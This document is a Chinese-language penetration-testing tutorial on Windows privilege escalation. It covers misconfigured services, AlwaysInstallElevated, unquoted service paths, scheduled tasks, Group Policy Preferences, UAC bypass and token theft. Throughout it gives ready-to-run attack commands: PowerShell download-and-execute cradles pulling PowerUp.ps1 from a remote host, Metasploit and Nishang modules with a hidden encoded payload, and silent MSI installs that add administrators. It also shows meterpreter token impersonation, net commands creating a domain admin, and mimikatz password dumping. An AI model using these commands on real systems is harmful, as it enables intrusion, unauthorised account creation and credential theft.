    • 内网渗透-权限提升

    windows的四种权限：

    User:普通用户权限，是系统中最安全的权限。
Administrators:管理员权限。可以利用Windows机制将自己提升为system权限，以便操作sam 文件等。
System:系统权限。可以对sam 等敏感文件进行读取，往往需要将administrator 权限提升为system权限才可以对sam 文件进行操作。
TrustedInstaller:windows 中最高权限。对系统文件，即使拥有system权限也无法进行修改。只有该权限的用户才可以进行修改。

    二、系统配置错误提权

    当无法通过系统内核溢出漏洞提权，此时可以尝试通过系统配置错误来提权。windows操作系统中常见的配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。

    1、系统服务权限配置错误

    1、使用 MSF 的exploit/windows/local/service_permissions 模块
2、使用 powershell的PowerUp 脚本，Invoke-AllChechs 模块进行检查，列出存在问题的所有服务。命令如下：
命令1：powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Invoke-AllChechs}" 
命令2：powershell.exe -exec bypass "IEX (New-Object Net.WebClient).DownloadString('C:\PowerUp.ps1'); Invoke-AllChecks"
命令3：powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://ip/PowerUp.ps1'); Invoke-AllChecks"
命令4：powershell -exec bypass -C IEX (New-Object Net.WebClient).DownloadString('C：\PowerUp.ps1'); Invoke-ServiceBinary -ServiceName 'OmniServers' -Username testuser -Password test@123  #利用Install-ServiceBinary模块，通过write-servicebinary 编写一个C# 服务来添加用户。

    2、注册表键AlwayslnstallElevated

    注册表键AlwayslnstallElevated 是一个策略设置项，Windows允许低权限用户以system权限运行安装文件。如果启用此策略设置项，任何权限的用户都能以NT AUTHORITY\SYSTEM 权限来安装恶意的MSI文件。

    该漏洞产生的原因是用户开启了windows Install 特权安装功能
配置如下：（运行-gpedit.msc）
1、组策略-计算机配置-管理模板-windows组件-window install- 永远以高特权进行安装：选择启用
2、组策略-用户配置-管理模板-windows组件-window install- 永远以高特权进行安装：选择启用
设置后，注册表以下两个位置自动创建键值“1”：
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

利用PowerUp 进行提权
1、powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('C:\PowerUp.ps1'); Get-RegistryAlwaysInstallElevated #使用Get-RegistryAlwaysInstallElevated模块检查注册表是否被设置，如果true，则已经设置。
2、运行write-UserAddMSI 模块，生成MSI文件，然后以普通用户权限运行UserAdd.msi 就会添加一个管理员账户。
命令：msiexec /q /i UserAdd.msi   #/i：安装程序 #/quite:安装过程禁止向用户发送信息。 /qn：不使用GUI

利用MSF 的exploit/windows/local/always_install_elevated 模块进行提权

    3、可信任服务路径漏洞

    漏洞产生原因：因为Windows 服务通常都是以system权限运行的，所以系统再解析服务所对应的文件路径中的空格时，就会以系统权限进行。例如：有一个文件路径“C:\Program Files\Some Folder\Service.exe”，对于该路径中的每一个空格，window都会尝试寻找并执行与空格前面的名字相匹配的程序。操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。

    该漏洞存在如下两种可能性：

    • 如果路径与服务有关，就任意创建一个服务或者编译service模板。
    • 如果路径与可执行文件有关，就任意创建一个可执行文件。

      如例子中,windows会依次尝试确定和执行下列程序：

    • C:\Program.exe
    • C:\Program Files\Some.exe
    • C:\Program Files\Some Folder\Service.exe
      因此，如果一个被“适当”命令的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以system权限运行（在大多数情况下）。
    a、手工查询进行利用：

1、使用wmi命令，检查目标机器是否存在该漏洞
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\windows\\" | findstr /i /v """   
2、如果有， 使用icacls工具进行查看。检查是否对目标文件夹的写权限。
 icacls "C:\Program Files\Some Folder\"

3、确定目标机器存在漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务
sc stop service_name
sc start service_name


b、使用MSF 中的windows service trusted path privilege escalation 模块进行提权。

    4、自动安装配置文件

    当网管在内网中给多台机器配置同一个环境时，往往使用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含了所有的安装配置信息，其中的一些还可能包含本地管理员账户和密码等信息。

    常见文件如下：

C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\system32\sysprep\unattend.xml
C:\Windows\system32\sysprep\panther\unattend.xml

dir /b /s c:Unattend.xml

    5、利用计划任务提权

    通过查看计划任务和目录权限的配置情况，如果攻击者发现对以高权限运行的任务所在目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样，在计划任务下次执行时，就会以高权限来运行恶意程序。

    1、查看系统运行的计划任务
 Schtasks /query /fo LIST /v
 Get-ScheduledTask
 Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike"*$env:UserName*")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}

2、查看文件加权限
   使用 accesschk.exe 查看文件
   列出某个驱动器下所有权限配置有缺陷的文件夹：
   accesschk.exe -uwdqsUsers c:\
   accesschk.exe -uwdqs "AuthenticatedUsers" c:\
   列出某个驱动器所有权限配置有缺陷的文件：
   accesschk.exe -uwqsUsers c:\*.*
   accesschk.exe -uwqs"AuthenticatedUsers"c:\*.*

3、替换目标文件
   如果存在写权限，可以替换为恶意程序

    三、组策略首选项提权

    win2008 server 引入了一项称为组策略首选项的新功能，该功能使管理员可以部署影响域中计算机/用户的特定配置。通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员账户的用户名或密码对注册表进行更改。

    SYSVOL
1、sysvol是活动目录的一个用于存储公共文件服务器副本的共享文件夹，在
域中的所有域控之间进行复制。
2、sysvol文件夹是在安装活动目录时候自动创建的，主要用来存放登录脚本、
组策略数据及其他域控需要的域信息。
3、sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目
录的域范围内共享。
4、整个sysvol目录在所有的域控中是自动同步和共享的，所有组策略在
C:\\Windows\\SYSVOL\\domain\\Policies中



前提:
1、管理员通过组策略统一修改过密码
2、在域控上执行:开始->运行->输入gpmc.msc->选择test.com->右键组策略对象->新建,我这里新建一个test组策略
会弹出一个组策略管理编辑器,然后计算机配置->首选项->控制面板设置本地用户和组
右键本地用户和组->新建->本地用户

    四、绕过UAC 提权

    1、使用MSF 绕过UAC 提权

    条件：
1、系统当前用户必须在管理员组中。
2、用户账户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机通知我”

MSF UAC 绕过模块
1、use exploit/windows/local/baypassuac #该模块运行时会因为在目标上创建多个文件而被杀毒软件识别，因此该模块提权成功率很低。
2、use exploit/windows/local/baypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机的硬盘，从而降低了被杀毒软件的查杀。
3、use exploit/windows/local/ask #创建一个可执行文件，目标机器会运行一个发起提权请求的程序，提示用户是否继续运行，如果继续则会获取一个高权限，即提权成功。（想要runas模块提权，当前用户必须在管理员组中或者知道管理员的密码，对UAC的设置则没有要求）

    2、使用Nishang 绕过UAC 提权

    使用Nishang 中Invoke-PsUACme 模块进行绕过，Invoke-PsUACme 模块使用来自UACME项目的DLL绕过UAC。

    PS > Invoke-PsUACme -Verbose  #使用sysprep方法并执行默认的payload
PS > Invoke-PsUACme -method oobe -Verbose #使用oobe方法并执行默认的payload
PS > Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e YourEncodedPayload" #使用-payload参数，可以自行指定要执行的payload

    五、令牌窃取提权

    令牌（token）是系统的临时密钥，相当于账户和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测性，攻击者或软件无法猜测出令牌。

    令牌分类：

    • 访问令牌（Access Token）：表示访问控制操作主体的系统对象。
    • 会话令牌（Session Token）：是交互会话中唯一的身份标识符。
    • 密保令牌（Security Token）：又叫做认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如U盾。

    1、使用MSF 窃取令牌

    1、meterpreter > use incognito  #使用incognito模块
2、meterpreter > list_tokens -u #列出有效的令牌
   Delegation Tokens Available （授权令牌，支持交互式登录。例如用户直接登录、远程桌面登录）
   Impersonation Tokens Available（模拟令牌，支持非交互式会话。例如使用net use 访问共享文件夹）
3、meterpreter > impersonate_token "WIN-123-JLDJF\\Administrator"（输入主机名\用户名时，需要输入两个\\）

    2、Rotten Potato 本地提权

    如果是webshell 的时候，需要使用执行rottenpotato获取其他令牌
1、meterpreter > use incognito  #使用incognito模块
2、meterpreter > list_tokens -u #列出有效的令牌
3、meterpreter > upload /root/rottenpotato.exe ./ #上传rottenpotato.exe 到目标机上
4、meterpreter > execute -HC -f rottenpotato.exe #执行rottenpotato.exe
5、meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"（输入主机名\用户名时，需要输入两个\\）

    3、添加域管理员

    方法一：
如果存在域管理进程，找到域管理进程之后，使用migrate 命令迁移到该进程。然后输入“shell” 进入命令行界面，添加域管理员
 net user test test@123 /ad /domain #添加域用户
 net group "domain admins" test /ad /domain #添加到域管理员组
 net group "domain admins" /domian  #查看是否添加到域管理员组

 方法二：
 使用MSF中的incognito 模块来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员

 add_user test test@123 -h 172.16.12.100 #在域控主机上添加一个账户
 add_group_user "Domain Admins" test -h 172.16.12.100 # 将该账户加到域管理员组中

    4、Empire 下的令牌窃取

    在Empire下获取服务器的权限后，可以使用内置的mimikatz 工具获取系统密码。

    1、获取empire shell 后，运行mimikatz
2、creds #查看密码
3、pth n #获取身份令牌(n表示creds 列出来的账户密码表的序号)
4、revtoself #恢复令牌权限
